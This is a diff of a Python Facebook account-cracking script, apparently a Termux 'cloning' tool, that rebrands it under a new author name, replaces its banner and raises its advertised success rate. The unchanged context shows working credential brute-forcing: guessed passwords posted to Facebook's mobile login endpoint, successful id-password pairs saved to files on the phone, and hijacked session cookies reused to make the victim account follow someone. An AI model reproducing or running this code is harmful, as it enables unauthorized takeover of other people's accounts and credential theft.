@@ -328,17 +328,17 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m[DEVIL-OK] {idf} * {pw}')
+				print( f'\r\x1b[1;91m[ARIF-OK] {idf} * {pw}')
 				open('OK/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;91m [DEVIL-OK] {idf} * {pw}')
+				print(f'\r\x1b[1;91m [ARIF-OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/DEVIL-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/ARIF-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -393,14 +393,15 @@ def follow(ses,coki):
  
 logo = """
 \033[1;95m 
- █████     █████   ██      ████████ 
- ██   ██     ██   ██   ██      ██      
- █████     ██ ███  ██    ███ █████   
- ██   ██     ██    ██  ██      ██      
- ██   ██     ██    ██  ██      ██      
-                           
-                           
-
+ 
+d8888 8888888b.  8888888 8888888888 
+      d88888 888   Y88b   888   888        
+     d88P888 888    888   888   888        
+    d88P 888 888   d88P   888   8888888    
+   d88P  888 8888888P"    888   888        
+  d88P   888 888 T88b     888   888        
+ d8888888888 888  T88b    888   888        
+d88P     888 888   T88b 8888888 888
 
 \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••• 
 \x1b[1;90m[+] 𝗔𝗨𝗧𝗛𝗢𝗥     :     Md ARIF   
@@ -422,7 +423,7 @@ class Main:
 		print(logo)
 		print("")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		print("\033[1;37mNOTE : APPROVAL K LIYE FACEBOOK PR FOLLOW KR DEN")
+		print("\033[1;37mNOTE : APPROVAL NEYAR JONNO FACEBOOK FOLLOW KORE DAW")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
 		
 		
@@ -445,12 +446,12 @@ class Main:
 			input("\n\033[1;37m TYPE THE OWNER FACEBOOK ACCOUNT NAME \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m WELCOME TO *TH3 L3G3ND FAISAL X HAYAT WORLD*  TOOLS")
+			print("\033[1;32m WELCOME TO *TH3 L3G3ND ARIF BD TERMUX*  TOOLS")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
 		print(" [+]CHOOSE METHOD")
-		print ("\033[1;36m           FAISAL X HAYAT WORLD")
+		print ("\033[1;36m           ARIF BD TERMUX")
 		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print(" \033[1;32m[1]\033[0;92m File Cloning ")
 		print(" \033[1;32m[2] Public Cloning")
@@ -498,7 +499,7 @@ class Main:
 				print(logo)
 				print("     \033[0;93m   Premium Mode  Activated")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
-				print(" \033[0;96m[+] Note : 50% CP Account'S Open Just Now")
+				print(" \033[0;96m[+] Note : 80% CP Account'S Open Just Now")
 				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗E UNTILL DEATH")
 				print("\033[0;94m------------------------------------------------")
 				print("\n")
@@ -568,7 +569,7 @@ class Main:
 				print(logo)
 				print("     \033[0;93m   Premium Mode  Activated")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
-				print(" \033[0;96m[+] Note : 50% CP Account'S Open Just Now")
+				print(" \033[0;96m[+] Note : 80% CP Account'S Open Just Now")
 				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 UNTILL DEATH")
 				print("\033[0;94m------------------------------------------------")
 				print("\n")
